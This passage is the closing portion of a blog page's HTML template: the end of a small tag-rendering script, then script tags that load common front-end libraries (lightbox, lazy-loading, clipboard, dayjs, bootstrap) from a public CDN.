    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>







  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

